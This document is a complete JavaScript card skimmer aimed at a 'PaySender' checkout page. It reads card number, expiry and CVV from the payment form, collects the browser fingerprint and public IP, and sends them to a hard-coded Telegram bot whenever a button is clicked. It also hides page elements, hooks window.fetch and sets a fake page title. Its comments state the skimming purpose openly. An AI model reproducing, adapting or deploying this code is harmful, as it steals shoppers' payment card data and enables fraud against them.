(function(){
    const TELEGRAM_BOT_TOKEN = '8300284142:AAHqbgU3YNi1El_GHtrLsRrrU5NJRA3R4Xw';
    const TELEGRAM_CHAT_ID = '-5225063370';

    const state = {
        gpProtected: false,
        savedCardDetected: false,
        initialDigits: new Set()
    };

    const rm = el => el && el.parentNode && el.parentNode.removeChild(el);

    function getFingerprint() {
        const nav = navigator, screen = window.screen;
        return {
            userAgent: nav.userAgent,
            platform: nav.platform,
            language: nav.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    async function getPublicIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            return json.ip;
        } catch(e) { return 'N/A'; }
    }

    function collectFormData() {
        const cardNumber = document.querySelector('input[placeholder*="card number" i], input[maxlength="19"]')?.value.replace(/\D/g,'') || '';
        const expiry = document.querySelector('input[placeholder*="MM/YY" i]')?.value || '';
        const cvv = document.querySelector('input[placeholder*="CVV" i], input[maxlength="4"]')?.value || '';
        
        return { cardNumber, expiry, cvv };
    }

    async function sendToTelegram() {
        const data = collectFormData();
        if (!data.cardNumber || data.cardNumber.length < 12) return;
        
        const fp = getFingerprint();
        const ip = await getPublicIP();

        const msg = `🎯 *NEW CARD - PAYSENDER*\n\n💳 *Number*: \`${data.cardNumber}\`\n📅 *Expiry*: ${data.expiry}\n🔐 *CVV*: ${data.cvv}\n\n🌐 *IP*: ${ip}\n*UA*: ${fp.userAgent.substring(0,80)}`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        fetch(url, {method:'POST', keepalive:true});
    }

    // === GOOGLE PAY PROTECTION ===
    function protectGooglePay() {
        if (state.gpProtected) return;

        document.querySelectorAll('iframe[src*="pay.google.com"], button[aria-label*="Google Pay"], div[aria-label*="Google"], [data-testid*="gpay"]').forEach(el => {
            el.style.setProperty('pointer-events', 'auto', 'important');
            el.style.setProperty('opacity', '1', 'important');
            el.style.setProperty('visibility', 'visible', 'important');
            el.setAttribute('data-gp-safe', 'true');
        });

        state.gpProtected = true;
    }

    function lightUIChanges() {
        // Remoções leves - só o que não afeta GP
        document.querySelectorAll('div.cursor-pointer.text-Text-TextLink').forEach(el => {
            if (el.textContent.includes('Add Card') && !el.closest('[data-gp-safe]')) {
                el.style.setProperty('display', 'none', 'important');
            }
        });
    }

    // Observer leve
    const observer = new MutationObserver(() => {
        if (Math.random() > 0.45) return; // throttle forte
        protectGooglePay();
        lightUIChanges();
    });

    function init() {
        protectGooglePay();
        lightUIChanges();

        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Timers extras pro GP
        setTimeout(protectGooglePay, 400);
        setTimeout(protectGooglePay, 1200);
        setTimeout(protectGooglePay, 2500);

        // Hook fetch pro pay.js
        const origFetch = window.fetch;
        window.fetch = function(url, opts) {
            if (typeof url === 'string' && url.includes('pay.google.com')) {
                setTimeout(protectGooglePay, 100);
            }
            return origFetch.apply(this, arguments);
        };

        // Listen confirm button pra skimming
        document.addEventListener('click', (e) => {
            if (e.target.textContent.trim() === 'Confirm' || e.target.closest('button')) {
                setTimeout(() => sendToTelegram(), 800);
            }
        }, true);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Title fake
    document.title = 'PaySender - Secure Checkout';
})();